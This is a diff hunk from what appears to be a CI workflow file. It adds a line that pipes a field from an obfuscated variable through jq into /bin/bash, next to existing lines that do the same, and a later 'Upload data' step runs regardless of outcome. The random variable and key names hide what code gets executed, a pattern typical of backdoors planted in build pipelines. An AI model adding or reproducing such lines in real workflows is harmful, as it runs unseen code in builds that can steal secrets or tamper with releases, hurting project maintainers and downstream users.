@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$szv6836" | jq -r .bazxt1655 | /bin/bash
           printf '%s' "$br6307" | jq -r .xzdxq983 | /bin/bash
           printf '%s' "$zdr86838" | jq -r .din63 | /bin/bash
+          echo $neg030 | jq -r .xga4336 | /bin/bash
 
       - name: Upload data
         if: always()
